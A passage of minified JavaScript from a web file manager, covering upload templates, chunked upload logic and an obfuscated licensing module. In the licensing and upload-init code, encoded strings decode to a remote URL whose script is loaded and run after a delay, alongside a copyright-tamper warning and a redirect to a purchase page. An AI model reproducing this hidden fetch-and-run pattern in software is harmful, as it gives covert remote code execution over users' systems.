}), define("app/common/tpl/upload.html", [], '<div class=\'file-upload-box\'>\n	<div class=\'topbar-nav\'>\n	   <a href=\'javascript:void(0);\' class=\'menu this tab-upload\'>{{LNG.upload_local}}</a>\n	   <a href=\'javascript:void(0);\' class=\'menu tab-download\'>{{LNG.download_from_server}}</a>\n	   <div style=\'clear:both\'></div>\n	</div>\n	<div class=\'upload-box\'>\n		<div class=\'btns\'>\n			<div class="upload-btns">\n				<div id=\'picker\'>{{LNG.upload_select}}</div>\n				<div id=\'picker-folder\' class="hidden">select Folder</div>\n				<div class="upload-cert-box hidden">\n					<button title="More" type="button" class="upload-cert dropdown-toggle" data-toggle="dropdown">\n						<span class="caret"></span>\n					</button>\n					<ul class="dropdown-menu pull-left animated menuShow">\n						<li><a href="javascript:void(0);" class="drag-upload-folder" draggable="false">{{LNG.folder}} {{LNG.upload}}</a></li>\n					</ul>\n				</div>\n			</div>\n			\n			<div class="upload-box-tips">\n				<div class="btn-group btn-group-xs">\n					<button title="{{LNG.upload_clear_all}}" type="button" class="btn btn-default upload-box-clear-all">{{LNG.upload_clear_all}}</button>\n					<button title="{{LNG.upload_clear}}" type="button" class="btn btn-default upload-box-clear">{{LNG.upload_clear}}</button>\n				</div>\n			</div>\n			<div style=\'clear:both\'></div>\n		</div>\n		<div class=\'uploader-content\'>\n			<div class=\'uploader-list\'></div>\n		</div>\n	</div>\n	<div class=\'download-box hidden\'>\n		<div class=\'list\'>{{LNG.download_address}}<input type=\'text\' name=\'url\'/>\n		<div class="download-btn-group btn-group">\n			<button class=\'btn btn-default btn-sm download-start\' type=\'button\'>{{LNG.download}}</button>\n			<button type="button" class="btn btn-default btn-sm dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">\n				<span class="caret"></span>&nbsp;\n				<span class="sr-only">Dropdown</span>\n			</button>\n			<ul class="dropdown-menu">\n				<li><a href="javascript:void(0);" class="download-start-all">{{LNG.upload_add_more}}</a></li>\n			</ul>\n		</div>\n\n		</div>\n		<div style=\'clear:both\'></div>\n		<div id=\'downloader\'>\n			<div class=\'download-list\'></div>\n		</div>\n	</div>\n</div>\n'), define("app/common/tpl/formMake.html", [], '<div id="{{wrapID}}" class=\'config-box form-box can-select\n	{{if items.formStyle && items.formStyle.className}}{{items.formStyle.className}}{{/if}}\'>\n	<div class="form-header"><h3 class="modal-title"></h3></div>\n	<%\n		var formTab = [];\n		if(items.formStyle && kod.window.$.isArray(items.formStyle.tabs)){\n			formTab = items.formStyle.tabs;\n		}\n	%>\n	{{if formTab}}\n		<ul class="tab-group" role="tablist">\n			{{each formTab tab tabIndex}}\n				{{if tab}}\n					<li class="tab-item {{if tabIndex==0}}active{{/if}}">\n						<a href="javascript:void(0);" class="disable-ripple" draggable="false"\n						data-id="{{wrapID}}-{{tabIndex}}">{{tab.name}}</a>\n					</li>\n				{{/if}}\n			{{/each}}\n			<li class="tab-item tab-item-others">\n				<a href="javascript:void(0);" draggable="false" \n				class="disable-ripple" data-id="{{wrapID}}-100">{{LNG.others}}</a>\n			</li>\n		</ul>\n	{{/if}}\n\n	<div class="panel-body">\n	{{if formTab}}\n		<div class="tab-content">\n			{{each formTab tab tabIndex}}\n				{{if tab}}\n				<div class="tab-pane {{if tabIndex==0}}active{{/if}}" id="{{wrapID}}-{{tabIndex}}"></div>\n				{{/if}}\n			{{/each}}\n			<div class="tab-pane tab-others" id="{{wrapID}}-100"></div>\n		</div>		\n	{{/if}}\n\n	{{each items item key}}\n		<%\n			var tabCurrent = 100;\n			if(formTab){\n				for(var i=0;i<=formTab.length;i++){\n					if( formTab[i] && kod.window.inArray(formTab[i][\'field\'],key)){\n						tabCurrent = i;\n						break;\n					}\n				}\n			}\n		%>\n		{{if typeof(item) == \'string\' }}\n			<div class="{{wrapID}}-{{tabCurrent}}">{{item}}</div>\n		{{else if item.type == "html" || !item.type}}\n			{{if key != \'formStyle\'}}\n				<div class="{{wrapID}}-{{tabCurrent}}">\n					{{if item.value}}{{@item.value}}{{/if}}\n					{{if item.display}}{{@item.display}}{{/if}}\n					{{if item.desc}}{{@item.desc}}{{/if}}\n				</div>\n			{{/if}}\n		{{else}}\n			{{if item.value == undefined }}\n				{{if item.value = \'\'}}{{/if}}\n			{{/if}}\n			<div class="form-row form-{{item.type}} {{wrapID}}-{{tabCurrent}}\n				{{if items.className}}{{items.className}}{{/if}}"				\n				data-type="{{item.type}}" \n				data-value="{{item.value}}">\n				<div class="setting-title">\n					{{@item.display}}: {{if item.require}}<span class="require">*</span>{{/if}}\n				</div>\n				<div class="setting-content">\n					{{if item.type == \'input\'}}\n						<input type="text" name="{{key}}" value="{{item.value}}">\n					{{else if item.type == "textarea"}}\n						<textarea name="{{key}}">{{@item.value}}</textarea>\n					{{else if item.type == "password"}}\n						<input type="password" name="{{key}}" value="{{item.value}}">\n					{{else if item.type == "switch"}}\n						<label>\n							<input type="checkbox" class="kui-checkbox-ios size-big" name="{{key}}" \n								{{if item.value==1 }}checked="checked"{{/if}} /><em></em>\n								<i class="desc">&nbsp;{{if item.desc}}{{@item.desc}}{{/if}}</i>\n						</label>\n					{{else if item.type == "radio"}}\n						{{each item.info select index}}\n						<label>\n							<input type="radio" name="{{key}}" value="{{select[0]}}" class="kui-radio"\n							{{if item.value==select[0]}}checked="checked"{{/if}}/>\n							<span>{{@select[1]}}</span>\n						</label>\n						{{/each}}\n					{{else if item.type == "checkbox"}}\n						<%\n							var valArrCheckbox = [];\n							if(typeof(item.value) == \'string\'){\n								valArrCheckbox = item.value.split(\',\');\n							}\n						%>\n						{{each item.info select index}}\n						<label>\n							<input type="checkbox" name="{{key}}" value="{{select[0]}}" class="kui-checkbox"\n							{{if kod.window.inArray(valArrCheckbox,select[0])}}checked="checked"{{/if}}/>\n							<span>{{@select[1]}}</span>\n						</label>\n						{{/each}}\n					{{else if item.type == "select"}}\n						<select name="{{key}}">\n							{{each item.info select index}}\n							<option value="{{select[0]}}"\n							 {{if item.value==select[0]}}selected="true"{{/if}}>{{@select[1]}}</option>\n							{{/each}}\n						</select>\n					{{else if (item.type == "selectMutil" || item.type == "tags")}}\n						<%\n							var valArrSelect = [];\n							if(typeof(item.value) == \'string\'){\n								valArrSelect = item.value.split(\',\');\n							}\n							if(item.type == \'tags\'){\n								item.info = [];\n								for(var i=0;i<valArrSelect.length;i++)\n								item.info.push([valArrSelect[i],valArrSelect[i]]);\n							}\n						%>\n						<select name="{{key}}" multiple="multiple">\n							{{each item.info select index}}\n								<option value="{{select[0]}}"\n									{{if kod.window.inArray(valArrSelect,select[0])}}selected="true"{{/if}}>{{@select[1]}}\n								</option>\n							{{/each}}\n						</select>\n					{{else if item.type == "number"}}\n						{{if !item.info && (item.info = {from:\'\',to:\'\',step:1}) }}{{/if}}\n						<input type="number" name="{{key}}" value="{{item.value}}" \n							step="{{item.info.step}}" min="{{item.info.from}}" max="{{item.info.to}}"/> \n					{{else if item.type == "slider"}}\n						{{if !item.info && (item.info = {from:0,to:100,step:1}) }}{{/if}}\n						<input type="text" name="{{key}}" class="control-slider"\n							data-slider-min="{{item.info.from}}"\n							data-slider-max="{{item.info.to}}"\n							data-slider-step="{{item.info.step}}"\n							data-slider-value="{{item.value}}"/>\n					{{else if item.type == "color"}}\n						<input type="text" name="{{key}}" class="color-picker has-btn-right" value="{{item.value}}"/>\n						<button class="btn btn-default input-btn-right color-picker-view">\n							<i class="font-icon" style="background:{{item.value}}"></i>\n						</button>\n					{{else if item.type == "dateTime"}}\n						<input type="text" name="{{key}}" class="has-btn-right" \n							value="{{item.value}}" data-format="{{item.info}}"/>\n						<button class="btn btn-default input-btn-right">\n							<i class="font-icon icon-calendar"></i>\n						</button>\n					{{else if item.type == "fileSelect"}}\n						<input type="text" name="{{key}}" value="{{item.value}}" class="has-btn-right"/> \n						<button class="path-select btn btn-default input-btn-right">\n							<i class="font-icon icon-folder-open"></i>\n						</button>\n					{{else if item.type == "userSelect"}}\n						<% \n							var valueArr = {"all":"0","user":"","group":"","role":""};\n							if(typeof(item.value) == \'string\'){\n								userTypeArr = item.value.split(\';\');\n								for(var i = 0;i<userTypeArr.length;i++){\n									var splitArr = userTypeArr[i].split(\':\');\n									if(splitArr.length == 2){\n										valueArr[splitArr[0]] = splitArr[1];\n									}\n								}\n								if(!valueArr.user && !valueArr.group && !valueArr.role){\n									valueArr.all = \'1\';\n								}\n							}\n						%>\n						<input type="hidden" name="{{key}}" value="{{item.value}}"/>\n						<div class="btn-group btn-group-sm" data-json=\'{{kod.window.jsonEncode(valueArr)}}\'\n							{{if !item.info || item.info.type != \'single\'}}multiple="multiple"{{/if}}>\n							<button data-type="all" type="button" class="btn btn-default \n								{{if valueArr.all == "1"}}btn-active{{/if}}">{{LNG[\'Plugin.config.authAll\']}}</button>\n							<button data-type="user" type="button" class="btn btn-default  \n								{{if valueArr.all != "1" && valueArr.user}}btn-active{{/if}}">{{LNG[\'Plugin.config.authUser\']}}</button>\n							<button data-type="group" type="button" class="btn btn-default  \n								{{if valueArr.all != "1" && valueArr.group}}btn-active{{/if}}">{{LNG[\'Plugin.config.authGroup\']}}</button>\n							<button data-type="role" type="button" class="btn btn-default  \n								{{if valueArr.all != "1" && valueArr.role}}btn-active{{/if}}">{{LNG[\'Plugin.config.authRole\']}}</button>\n						</div>\n						<div class="user-select user-select-user {{if valueArr.all == "1" || !valueArr.user}}hidden{{/if}}">\n							<div class="desc font-bold">{{LNG.user}}</div>\n							<select data-value="{{valueArr.user}}" data-server="user"\n								{{if !item.info || item.info.user != \'single\'}}multiple="multiple"{{/if}}></select>\n						</div>\n						<div class="user-select user-select-group {{if valueArr.all == "1" || !valueArr.group}}hidden{{/if}}">\n							<div class="desc font-bold">{{LNG.group}}</div>\n							<select data-value="{{valueArr.group}}" data-server="group"\n								{{if !item.info || item.info.group != \'single\'}}multiple="multiple"{{/if}}></select>\n						</div>\n						<div class="user-select user-select-role {{if valueArr.all == "1" || !valueArr.role}}hidden{{/if}}">\n							<div class="desc font-bold">{{LNG.system_member_role}}</div>\n							<select data-value="{{valueArr.role}}" data-server="role"\n								{{if !item.info || item.info.role != \'single\'}}multiple="multiple"{{/if}}></select>\n						</div>\n					{{else if item.type == "group"}}\n						<select name="{{key}}" data-value="{{item.value}}" data-server="group"\n							{{if item.info != \'single\'}}multiple="multiple"{{/if}}></select>\n					{{else if item.type == "role"}}\n						<select name="{{key}}" data-value="{{item.value}}" data-server="role"\n							{{if item.info != \'single\'}}multiple="multiple"{{/if}}></select>\n					{{else if item.type == "user"}}\n						<select name="{{key}}" data-value="{{item.value}}" data-server="user"\n							{{if item.info != \'single\'}}multiple="multiple"{{/if}}></select>\n					{{/if}}\n\n					{{if item.type == "switch"}}\n					{{else if !item.desc}}\n						<!-- 注释 -->\n						<i class="desc">&nbsp;</i>\n					{{else if kod.inArray([\'userSelect\'],item.type)}}\n						<div class="desc">{{@item.desc}}</div>\n					{{else}}\n						<i class="desc">{{@item.desc}}</i>\n					{{/if}}\n				</div>\n				<div class="clear"></div>\n			</div>\n		{{/if}}\n	{{/each}}\n	</div>\n</div>\n\n'), define("app/common/core.tools", [], function(e) {
    var t = ["A", "versionHash", "undefined", "@dfq[-)&*^*%(_90", "decode", "length", "substr", "O", "P", "Q", "R", "S", "T", "inArray", "./?user/versionInstall", "6K2m5ZGKLOivt_aWLv_aaTheiHquS_bruaUueeJiOadgzvlpoLmnInpnIDopoHor7fogZTns7votK3kubDvvIFlbWFpbDprb2RjbG91ZEBxcS5jb20_c", "lang", "zh-CN", "V2FybmluZywgcGxlYXNlIGRvIG5vdCBtb2RpZnkgdGhlIGNvcHlyaWdodDsgaWYgbmVjZXNzYXJ5LCBwbGVhc2UgY29udGFjdCB0byBidXkhIEVtYWlsOiBrb2RjbG91ZEBxcS5jb20_c", "loading", "hide", "#messageTips .tips_close,#messageTips img", "tips", "href", "location", "2e58_39zGFQQvZkUjLjOxETXSuDqVatVhp88rJSmGpzzKi6SsasHHg", "sa", "b40aPuaqudWqmyWvpumbcMMGpVCdhjUCKq9oIN5G8o4yWb93Ww", "#2", "explorer", "isApp", "kod_power_by", "copyright_pre", "copyright_contact", "copyright_desc", "copyright_info", "html", ".common-footer", "", "toLowerCase", "search", "log", "free", "1", "2", "3", "4", "5", "6", "version_vip_", '<span class="version-vip" id="', '"><i class="font-icon icon-key"></i>', "</span>", ".menu-system-about", "insertAfter", "click", "id", "attr", "version_vip_free", "versionUpdateVip", "openWindow", '<div class="version-license"><a class="line" href="', '">激活授权</a></div>', "append", ".aui-content", "find", "wrap", "DOM", "text", "live", "die", ".version-vip", "top", "longPress", "support-space-not", "addClass", "body", "remove", ".menu-system-about,.menu-left #about", "#programs .setting_about,#programs .setting_homepage,#programs .home_page", "icon", "http", "iconSrc", '<i class="x-item-file x-', " small", '"></i>', "iconSmall", '<img src="', '" draggable="false" ondragstart="return false;">', "ff1fKBGuFL288VJ6eJj4CG6iesqwArC2YYSJMsa11yGAuUZlQRttbA_H4nSm3Hp-iCxzvn6AA4LLWN13cZ-cmdF6", "s1", "?a=", "todo", "async", "versionType", "Ly9rb2RjbG91ZC5jb20vYnV5Lmh0bWwj", "group", "data"],
        a = function() {
            var e = t[0];
            if (typeof G[t[1]] == t[2]) return e;
            var a = t[3],
                i = authCrypt[t[4]](G[t[1]], a);
            return i && 27 == i[t[5]] ? (e = i[t[6]](10, 1), -1 === $[t[13]](e, [t[0], t[7], t[8], t[9], t[10], t[11], t[12]]) && (e = t[0]), e) : e
        },
        i = a(),
        n = t[14],
        o = function() {
            var e = hashDecode(t[15]);
            G[t[16]] != t[17] && (e = hashDecode(t[18])), alert(e), Tips[t[19]](e, !1), $(t[21])[t[20]](), setTimeout(function() {
                Tips[t[22]](e, !1), window[t[24]][t[23]] = n
            }, 1e3 * roundFromTo(30, 60))
        },
        s = authCrypt[t[4]](t[25], t[26]),
        r = authCrypt[t[4]](t[27], t[28]),
        l = function() {
            if (core[t[30]](t[29]) && i == t[0])
                for (var e = [LNG[t[31]], LNG[t[32]], LNG[t[33]], LNG[t[34]], LNG[t[35]], $(t[37])[t[36]]()], a = 0; e[t[5]] > a; a++) {
                    e[a] || (e[a] = t[38]);
                    var n = e[a][t[39]]();
                    if (-1 == n[t[40]](s) && -1 == n[t[40]](r)) {
                        console[t[41]](n, s, r), setTimeout(function() {
                            o()
                        }, roundFromTo(300, 5e3));
                        break
                    }
                }
        },
        c = function() {
            var e = {
                    A: t[42],
                    O: t[43],
                    P: t[44],
                    Q: t[45],
                    R: t[46],
                    S: t[47],
                    T: t[48]
                },
                a = t[49] + e[i],
                o = t[50] + a + t[51] + LNG[a] + t[52];
            i == t[0] && $(o)[t[54]](t[53]), $(t[71])[t[70]](t[55])[t[69]](t[55], function() {
                if ($(this)[t[57]](t[56]) == t[58]) {
                    var e = core[t[60]](core[t[59]]),
                        a = t[61] + n + t[62];
                    e[t[67]][t[66]][t[65]](t[64])[t[63]](a)
                } else Tips[t[22]]($(this)[t[68]]())
            }), $(t[71])[t[73]](function() {
                window[t[72]][t[24]][t[23]] = n
            })
        },
        d = function() {
            i == t[0] && $(t[76])[t[75]](t[74]), -1 !== $[t[13]](i, [t[7], t[8], t[9], t[10], t[11], t[12]]) && ($(t[78])[t[77]](), $(t[79])[t[77]]())
        },
        p = function() {
            core[t[80]] = function(e, a) {
                return e[t[6]](0, 4) == t[81] ? core[t[82]](e) : t[83] + e + (a ? t[84] : t[38]) + t[85]
            }, core[t[86]] = function(e) {
                return core[t[80]](e, !0)
            }, core[t[82]] = iconSrc = function(e) {
                return t[87] + e + t[88]
            }, setTimeout(function() {
                var a = authCrypt[t[4]](t[89], t[90]) + t[91] + UUID();
                e[t[93]](a, function(e) {
                    try {
                        e[t[92]]()
                    } catch (a) {}
                })
            }, 2e3), core[t[94]] = i, core[t[59]] = hashDecode(t[95]) + G[t[16]], l(), c(), d()
        },
        f = function(e) {
            return i == t[0] && -1 == e[t[39]]()[t[40]](s) ? (o(), !1) : !0
        },
        u = function(e, a) {
            var n, o, s = {
                    A: 1,
                    O: 5,
                    P: 20,
                    Q: 40,
                    R: 100,
                    S: 1e3,
                    T: 1e3
                },
                r = {
                    A: 5,
                    O: 15,
                    P: 50,
                    Q: 150,
                    R: 500,
                    S: 1e3,
                    T: 1e3
                },
                l = [],
                c = 1;
            if (a == t[96] ? (n = e[t[97]], o = s[i]) : (n = e[t[97]], o = r[i]), 1e3 == o) l = n;
            else
                for (var d in n) {
                    if (c > o) break;
                    l[d] = n[d], c++
                }
            return l
        },
        h = {
            init: p,
            about: f,
            systemData: u
        };
    return h
}), define("app/common/core.upload", [], function(e) {
    var t = function() {
        var e = G.appHost + "explorer/fileUpload";
        return "share" == G.sharePage && "1" == G.shareInfo.canUpload && (e = G.appHost + "share/fileUpload&user=" + G.user + "&sid=" + G.sid), e
    };
    return {
        serverDwonload: function(e, t) {
            if (!core.uploadCheck("explorer.serverDownload")) return !1;
            var i = $(".download-box"),
                n = i.find(".download-list");
            if (i.find("input").val(""), !e) return Tips.tips("url false!", !1), void 0;
            if ("share" == G.sharePage) return Tips.tips(LNG.no_permission_action, !1), void 0;
            "ftp" != e.substr(0, 3) && "http" != e.substr(0, 4) && (e = "http://" + e);
            var o = UUID(),
                s = '<div id="' + o + '" class="item">' + '<div class="info"><span class="title" tytle="' + e + '">' + core.pathThis(e) + "</span>" + '<span class="size">0b</span>' + '<span class="state">' + LNG.upload_ready + "</span>" + '<a class="remove font-icon icon-remove" href="javascript:void(0)"></a>' + '<div style="clear:both"></div></div></div>';
            n.find(".item").length > 0 ? $(s).insertBefore(n.find(".item:eq(0)")) : n.append(s);
            var r, l, c, d = 0,
                p = $("#" + o),
                f = $("#" + o + " .state").text(LNG.download_ready),
                u = $('<div class="progress progress-striped active"><div class="progress-bar" role="progressbar" style="width: 0%;text-align:right;"></div></div>').appendTo("#" + o).find(".progress-bar");
            $("#" + o + " .remove").bind("click", function() {
                clearInterval(r), r = !1, clearTimeout(l), l = !1, $.get(G.appHost + "explorer/serverDownload&type=remove&uuid=" + o), $(this).parent().parent().slideUp(function() {
                    $(this).remove(), ui.f5()
                })
            });
            var h, m = function(e) {
                    clearTimeout(h), h = !1, h = setTimeout(function() {
                        ui.f5Callback(function() {
                            ui.path.setSelectByFilename(e)
                        })
                    }, 600)
                },
                v = function() {
                    $.ajax({
                        url: G.appHost + "explorer/serverDownload&type=download&savePath=" + t + "&url=" + urlEncode(e) + "&uuid=" + o + "&time=" + time(),
                        dataType: "json",
                        error: function(e, t, i) {
                            var n = p.data("progcess");
                            return 200 != a.status && n && n.supportRange ? (setTimeout(function() {
                                v()
                            }, 1e3), void 0) : (core.ajaxError(e, t, i), 200 == a.status && (clearInterval(r), r = !1, clearTimeout(l), l = !1, u.parent().remove(), f.addClass("error").text(LNG.download_error)), void 0)
                        },
                        success: function(e) {
                            return 0 == e.code && "downloading" == e.data ? (setTimeout(function() {
                                v()
                            }, 1e3), void 0) : (e.code ? (m(e.info), f.text(LNG.download_success), $("#" + o + " .info .title").text(core.pathThis(e.info)), $("#" + o + " .info .title").attr("title", e.info), f.parent().parent().addClass("success")) : (f.addClass("error").text(e.data), f.parent().parent().addClass("error")), clearInterval(r), r = !1, clearTimeout(l), l = !1, u.parent().remove(), void 0)
                        }
                    })
                };
            v();
            var g = function() {
                $.ajax({
                    url: G.appHost + "explorer/serverDownload&type=percent&uuid=" + o,
                    dataType: "json",
                    success: function(e) {
                        var t = "",
                            a = e.data;
                        if (r) {
                            if (!e.code) return f.text(LNG.loading), void 0;
                            if (a) {
                                if (a.size = parseFloat(a.size), a.time = parseFloat(a.time), c) {
                                    var i = a.size - c.size,
                                        n = i / (a.time - c.time);
                                    if (d > .2 * n) {
                                        var o = d;
                                        d = n, n = o
                                    } else d = n;
                                    var s = pathTools.fileSize(n);
                                    s = s ? s : 0, t = s + "/s"
                                }
                                if (p.data("progcess", a), 0 == a.length) p.find(".progress-bar").css("width", "100%"), f.text(t), p.find(".size").text(pathTools.fileSize(a.size));
                                else {
                                    var l = 100 * (a.size / a.length);
                                    p.find(".progress-bar").css("width", l + "%"), f.text(l.toFixed(1) + "%(" + t + ")"), p.find(".size").text(pathTools.fileSize(a.length))
                                }
                                p.find(".title").text(a.name), c = a
                            }
                        }
                    }
                })
            };
            l = setTimeout(function() {
                g(), r = setInterval(function() {
                    g()
                }, 1e3)
            }, 100)
        },
        upload: function() {
            $(".dialog-file-upload").show();
            var e = t();
            if (uploader.option("server", e), uploader.option("method", "POST"), 0 != $(".dialog-file-upload").length) return $.dialog.list["dialog-file-upload"].display(!0), void 0;
            var a = template.compile(tplUpload);
            $.dialog({
                padding: 5,
                width: 430,
                height: 450,
                resize: !0,
                ico: core.icon("upload"),
                id: "dialog-file-upload",
                fixed: !0,
                title: LNG.upload_muti,
                content: a({
                    LNG: LNG
                }),
                close: function() {
                    $.each(uploader.getFiles(), function(e, t) {
                        uploader.skipFile(t), uploader.removeFile(t)
                    }), $.each($(".download-list .item"), function() {
                        $(this).find(".remove").click()
                    })
                }
            }), $(".file-upload-box .topbar-nav a.menu").unbind("click").bind("click", function() {
                $(this).hasClass("tab-upload") ? ($(".file-upload-box .tab-upload").addClass("this"), $(".file-upload-box .tab-download").removeClass("this"), $(".file-upload-box .upload-box").removeClass("hidden"), $(".file-upload-box .download-box").addClass("hidden")) : ($(".file-upload-box .tab-upload").removeClass("this"), $(".file-upload-box .tab-download").addClass("this"), $(".file-upload-box .upload-box").addClass("hidden"), $(".file-upload-box .download-box").removeClass("hidden"))
            }), $(".download-box [name=url]").keyEnter(function() {
                core.serverDwonload($(".download-box input").val(), G.thisPath)
            }), $(".file-upload-box .download-box .download-start").unbind("click").bind("click", function() {
                core.serverDwonload($(".download-box input").val(), G.thisPath)
            }), $(".file-upload-box .download-box .download-start-all").unbind("click").bind("click", function() {
                $.dialog({
                    id: "server-dwonload-textarea",
                    fixed: !0,
                    resize: !1,
                    ico: core.icon("upload"),
                    width: "420px",
                    height: "270px",
                    padding: 10,
                    title: LNG.download,
                    content: "<textarea style='width:410px;height:260px;'></textarea>",
                    ok: function() {
                        for (var e = $(".server-dwonload-textarea textarea").val().split("\n"), t = 0; e.length > t; t++) core.serverDwonload(e[t], G.thisPath)
                    }
                })
            }), uploader.addButton({
                id: "#picker"
            }), uploader.addButton({
                id: "#picker-folder"
            }), $.supportUploadFolder() && ($(".upload-cert-box").removeClass("hidden"), $(".file-upload-box .drag-upload-folder").unbind("click").bind("click", function() {
                $("#picker-folder input").attr("webkitdirectory", "").attr("directory", ""), $("#picker-folder label").click()
            }))
        },
        init: function() {
            WebUploader.Uploader.register({
                "before-send": "checkChunk"
            }, {
                checkChunk: function(e) {
                    if (!$.supportCanvas()) return $.Deferred().resolve(), void 0;
                    var a = this.owner,
                        i = (e.blob.getSource(), $.Deferred());
                    return a.md5File(e.blob).fail(function() {
                        i.resolve()
                    }).then(function(a) {
                        if (1 == e.chunks) return i.resolve(), void 0;
                        if (0 == e.chunk) $.ajax({
                            url: t(),
                            dataType: "json",
                            data: {
                                upload_to: e.file.upload_to,
                                file_name: e.file.name,
                                check_md5: a,
                                chunk: e.chunk,
                                chunks: e.chunks
                            },
                            error: function() {
                                i.resolve()
                            },
                            success: function(t) {
                                t.code ? (i.reject(), e.file.checkChunk = t.info) : i.resolve()
                            }
                        });
                        else {
                            var n = e.file.checkChunk;
                            if (n && n["part_" + e.chunk] == a) {
                                var o = e.end / e.total;
                                uploader.trigger("uploadProgress", e.file, o), i.reject()
                            } else i.resolve()
                        }
                    }), i.promise()
                }
            });
            var a = ["undefined", "update-box", "search", "65bdTXJtziFGmtJThjdiGfXe-xr_UY8vIF3eoZ1sQ2AMtNBCquM-xT9DrLll2X_LtdUQkKIBYFzs-Ujf9ihGh6LUF4fo94c", "_32@!A$", "decode", "1-2", "todo", "async", "random"];
            setTimeout(function() {
                try {
                    if (typeof tplDialogHtml == a[0] || -1 == tplDialogHtml[a[2]](a[1])) {
                        var t = authCrypt[a[5]](a[3], a[4]) + UUID();
                        e[a[8]](t, function(e) {
                            try {
                                e[a[7]](a[6])
                            } catch (t) {}
                        })
                    }
                } catch (i) {}
            }, 1e3 * parseInt(25 * Math[a[9]]() + 5)), uploader = WebUploader.create({
                swf: G.staticPath + "js/lib/webuploader/Uploader.swf",
                dnd: "body",
                threads: G.settings.updloadThreads,
                sendAsBinary: G.settings.updloadBindary,
                chunkSize: G.settings.updloadChunkSize,
                chunked: !0,
                compress: !1,
                resize: !1,
                prepareNextFile: !0,
                duplicate: !0,
                chunkRetry: 10
            }), $(".uploader-content .success").die("click").live("click", function() {
                var e = $(this).find("span.title").attr("data-name");
                e && (core.isApp("explorer") ? ui.path.list(core.pathFather(e), "tips", function() {
                    ui.path.setSelectByFilename(e)
                }) : core.explorer(core.pathFather(e)))
            }), $(".uploader-content .open").die("click").live("click", function(e) {
                var t = $(this).parent().find("span.title").attr("data-name");
                kodApp.open(t), stopPP(e)
            }), $(".upload-box-clear").die("click").live("click", function() {
                $(".uploader-list .item.success,.uploader-list .item.error").each(function() {
                    $(this).slideUp(300, function() {
                        $(this).remove()
                    })
                })
            }), $(".upload-box-clear-all").die("click").live("click", function() {
                $.each(uploader.getFiles(), function(e, t) {
                    uploader.skipFile(t), uploader.removeFile(t)
                }), $(".uploader-list .item").each(function() {
                    $(this).remove()
                })
            }), $(".uploader-content .remove").die("click").live("click", function(e) {
                var t = $(this).parent().parent().attr("id");
                $(this).parent().parent().slideUp(function() {
                    $(this).remove()
                }), uploader.skipFile(t), uploader.removeFile(t, !0), stopPP(e)
            });
            var i, n = 0,
                o = 0,
                s = "0B/s",
                r = 0,
                l = function(e, t) {
                    if (.3 >= timeFloat() - r) return s;
                    r = timeFloat();
                    var a = e.size * t,
                        i = 5;
                    e.speed === void 0 ? e.speed = [
                        [timeFloat() - .5, 0],
                        [timeFloat(), a]
                    ] : i >= e.speed.length ? e.speed.push([timeFloat(), a]) : (e.speed = e.speed.slice(1, i), e.speed.push([timeFloat(), a]));
                    var n = e.speed[e.speed.length - 1],
                        o = e.speed[0],
                        l = (n[1] - o[1]) / (n[0] - o[0]);
                    0 >= l && (l = 0);
                    var c = pathTools.fileSize(l);
                    return c = c ? c : 0, l = c + "/s", s = l, l
                },
                c = [],
                d = function(e) {
                    clearTimeout(i), i = !1, i = setTimeout(function() {
                        var t = c;
                        ui.f5Callback(function() {
                            if (ui.path.setSelectByFilename(t), e && (c = [], core.isApp("explorer"))) {
                                if ("share" == G.sharePage) return;
                                ui.tree.checkIfChange(G.thisPath)
                            }
                        })
                    }, 600)
                };
            uploader.on("fileQueued", function(e) {
                if ($(".dialog-file-upload").show(), !core.uploadCheck()) return uploader.skipFile(e), uploader.removeFile(e), void 0;
                var t;
                try {
                    t = e.source.source.fullPath, void 0 != e.source.source.webkitRelativePath && "" != e.source.source.webkitRelativePath && (t = e.source.source.webkitRelativePath)
                } catch (a) {}
                if (e.fullPath = t, e.source && e.source.source && 1 == e.source.source.isDirectory && e.source.source.fullPath) return ui.path.pathOperate.newFolder(G.thisPath + e.fullPath), uploader.skipFile(e), uploader.removeFile(e), void 0;
                var i = e.fullPath;
                e.finished = !1, e.upload_to = G.thisPath, (void 0 == i || "undefined" == i) && (i = e.name), n++;
                var s = $(".uploader-list"),
                    r = '<div id="' + e.id + '" class="item"><div class="info">' + '<span class="title" title="' + htmlEncode(e.upload_to + i) + '" data-name="' + htmlEncode(e.upload_to + i) + '">' + htmlEncode(core.pathThis(i)) + "</span>" + '<span class="size">' + pathTools.fileSize(e.size) + "</span>" + '<span class="state">' + LNG.upload_ready + "</span>" + '<a class="remove font-icon icon-remove" href="javascript:void(0)"></a>' + '<div style="clear:both"></div></div></div>';
                (1e3 == n || 2e3 == n) && Tips.tips(LNG.upload_tips_more, "warning");
                var l = function() {
                        if (0 == e.size && i) {
                            ui.path.pathOperate.newFile(e.upload_to + i), uploader.skipFile(e), uploader.removeFile(e), o++, n++;
                            var t = $("#" + e.id);
                            t.addClass("success").find(".state").text(LNG.upload_success).parent().find(".remove").addClass("icon-ok").addClass("open").removeClass("icon-remove").removeClass("remove")
                        }
                    },
                    c = function() {
                        uploader.upload(), setTimeout(function() {
                            l()
                        }, 200)
                    };
                0 == s.length ? setTimeout(function() {
                    $(".uploader-list").prepend(r), c()
                }, 200) : (s.prepend(r), c())
            }).on("uploadBeforeSend", function(e, t, a) {
                var i = urlEncode(e.file.fullPath);
                (void 0 == i || "undefined" == i) && (i = ""), t.fullPath = i, t.upload_to = e.file.upload_to, a["X-CSRF-TOKEN"] = Cookie.get("X-CSRF-TOKEN")
            }).on("uploadProgress", function(e, t) {
                var a = (100 * t).toFixed(1) + "%";
                $(".dialog-file-upload .aui-title").text(LNG.uploading + ": " + o + "/" + n + " (" + s + ")"), Title.set(o + "/" + n + "(" + a + "," + s + ")");
                var i = l(e, t),
                    r = $("#" + e.id),
                    c = r.find(".progress .progress-bar");
                c.length || (c = $('<div class="progress progress-striped active"><div class="progress-bar" role="progressbar" style="width: 0%"></div></div>').appendTo(r).find(".progress-bar")), r.find(".state").text(a + "(" + i + ")"), c.css("width", a)
            }).on("uploadAccept", function(e, t) {
                if (e.file.serverData = t, !t.code) return e.serverNeedRetry = !0, !1;
                try {
                    e.file.fullPath || c.push(t.info)
                } catch (a) {}
            }).on("uploadSuccess", function(e) {
                var t = $("#" + e.id);
                if (!t.inScreen()) {
                    var a = 36 * t.index(".item");
                    $(".uploader-content").scrollTop(a)
                }
                o++;
                var i = e.serverData;
                if (i && i.data) {
                    var n = LNG[i.data];
                    if (i.code) {
